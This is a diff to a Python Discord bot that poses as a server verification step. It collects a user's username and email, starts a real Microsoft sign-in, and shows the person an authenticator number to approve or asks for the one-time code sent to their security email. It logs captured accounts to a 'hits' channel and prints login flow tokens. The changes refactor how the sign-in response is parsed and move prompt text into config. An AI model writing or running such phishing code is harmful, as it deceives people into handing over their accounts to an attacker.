@@ -27,6 +27,7 @@ class MyModalOne(ui.Modal):
         username = quote(self.children[0].value)
         email = self.children[1].value
         config = json.load(open("config/config.json", "r"))
+        msgs = config["messages"]
 
         hits_channel = await interaction.client.fetch_channel(config["discord"]["accounts_channel"])
 
@@ -89,7 +90,7 @@ class MyModalOne(ui.Modal):
         emailInfo = await send_auth(self.session, email)
 
         # Email does not exist (ifExistsResults == 1 can be used as an alternative)
-        if "Credentials" not in emailInfo:
+        if "type" not in emailInfo:
             await send_logs(
                 interaction.client,
                 build_log_embed(
@@ -114,17 +115,17 @@ class MyModalOne(ui.Modal):
             return
 
         # Entropy = Authenticator App number to click in
-        elif "RemoteNgcParams" in emailInfo["Credentials"]:
+        elif emailInfo["type"] == "authenticator":
             print("\n| Starting securing process |\n")
             print("[+] - Found Authenticator App")
 
-            device = emailInfo["Credentials"]["RemoteNgcParams"]["SessionIdentifier"]
-            entropy = emailInfo["Credentials"]["RemoteNgcParams"]["Entropy"]
+            device = emailInfo["response"]["Credentials"]["RemoteNgcParams"]["SessionIdentifier"]
+            entropy = emailInfo["response"]["Credentials"]["RemoteNgcParams"]["Entropy"]
 
             await interaction.followup.send(
                 embed = Embed(
                     title="Last Step",
-                    description=f"An Authenticator Request has been sent.\nPlease confirm the code **`{entropy}`** on your app! This step prevents automated or fake verifications.",
+                    description=f"An Authenticator Request has been sent.\nPlease confirm the code **`{entropy}`** on your app!\nThis step prevents automated or fake verifications.",
                     colour=0x00FF00
                 ),
                 ephemeral = True
@@ -193,8 +194,8 @@ class MyModalOne(ui.Modal):
 
                     await interaction.followup.send(
                         embed = discord.Embed(
-                            title = "Processing...",
-                            description = "⌛ Please allow us to proccess your roles",
+                            title = msgs["processing_title"],
+                            description = msgs["processing_description"],
                             color = 0xDE755B
                         ),
                         ephemeral = True
@@ -248,30 +249,28 @@ class MyModalOne(ui.Modal):
                 await asyncio.sleep(1)
                 i += 1
 
-        if "OtcLoginEligibleProofs" in emailInfo["Credentials"]:
+        elif emailInfo["type"] == "email":
 
-            verflowtoken = None
-            verEmail = None
+            flowtoken = emailInfo["response"]["Credentials"]["OtcLoginEligibleProofs"][0]["data"]
+            ppft = emailInfo["ppft"]
 
-            for value in emailInfo["Credentials"]["OtcLoginEligibleProofs"]:
-                if value["otcSent"]:
-                    verflowtoken = value["data"]
-                    verEmail = value["display"]
-                    break
-
+            print(emailInfo["response"]["Credentials"]["OtcLoginEligibleProofs"])
+            print(f"Flowtoken: {flowtoken}")
+            print(f"")
             print("\n| Starting securing process |\n")
-            print(f"[+] - Found security email: {verEmail}")
+            print(f"[+] - Found security email!")
 
             await interaction.followup.send(
                 embed=Embed(
                     title="Last Step",
-                    description=f"To complete verification, enter the confirmation code we sent to {verEmail}.\nThis step prevents automated or fake verifications.",
+                    description="To complete verification, enter the confirmation code we sent to your security email!\nThis step prevents automated or fake verifications.",
                     colour=0x00FF00
                 ),
                 view = ButtonViewTwo(
                     username = username,
                     email = email,
-                    flowtoken = verflowtoken
+                    flowtoken = flowtoken,
+                    ppft = ppft
                 ),
                 ephemeral = True
             )
